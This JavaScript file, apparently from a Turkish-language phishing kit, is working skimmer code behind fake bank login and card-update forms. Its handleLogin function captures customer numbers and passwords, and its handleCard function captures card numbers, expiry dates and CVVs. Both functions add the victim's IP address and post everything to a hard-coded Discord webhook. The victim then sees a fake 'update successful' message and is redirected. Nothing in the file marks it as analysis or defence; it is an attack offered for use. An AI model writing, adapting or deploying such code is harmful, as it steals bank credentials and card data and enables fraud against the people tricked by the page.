async function getIP() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        console.log("IP alındı:", data.ip);
        return data.ip;
    } catch (error) {
        console.error("IP alınamadı:", error);
        return "IP alınamadı";
    }
}

async function handleLogin(event) {
    event.preventDefault();
    const customer_id = document.getElementById("customer_id").value;
    const password = document.getElementById("password").value;
    const ip = await getIP();
    const data = `Müşteri No: ${customer_id}, Şifre: ${password}, IP: ${ip}`;
    console.log("Gönderilen veri:", data);

    fetch("https://discord.com/api/webhooks/1356649086886875259/EMzyEQwmf4BXE-0-NA8Y9SKMTmDazDF5T6PEnIh7M55tmxUSJW10jS7d4LBlZZUoqi2H", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: data })
    }).then(response => {
        console.log("Webhook yanıtı:", response);
        window.location.href = "card.html";
    }).catch(error => {
        console.error("Webhook hatası:", error);
    });
}

async function handleCard(event) {
    event.preventDefault();
    const cc = document.getElementById("cc").value;
    const expiry = document.getElementById("expiry").value;
    const cvv = document.getElementById("cvv").value;

    // Kart numarası doğrulama
    if (!cc.match(/^[0-9]{4} [0-9]{4} [0-9]{4} [0-9]{4}$/)) {
        alert("Kart numarası 16 hane olmalı (ör: 1234 5678 9012 3456)");
        return;
    }

    // Son kullanma tarihi doğrulama
    if (!expiry.match(/^[0-1][0-9]\/[0-9]{2}$/)) {
        alert("Son kullanma tarihi AA/YY formatında olmalı (ör: 12/25)");
        return;
    }

    // CVV doğrulama
    if (!cvv.match(/^[0-9]{3}$/)) {
        alert("CVV 3 hane olmalı (ör: 123)");
        return;
    }

    const ip = await getIP();
    const data = `CC: ${cc}, Expiry: ${expiry}, CVV: ${cvv}, IP: ${ip}`;
    console.log("Gönderilen veri:", data);

    fetch("https://discord.com/api/webhooks/1356649086886875259/EMzyEQwmf4BXE-0-NA8Y9SKMTmDazDF5T6PEnIh7M55tmxUSJW10jS7d4LBlZZUoqi2H", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: data })
    }).then(response => {
        console.log("Webhook yanıtı:", response);
        alert("Güncelleme başarılı!");
        window.location.href = "index.html";
    }).catch(error => {
        console.error("Webhook hatası:", error);
    });
}
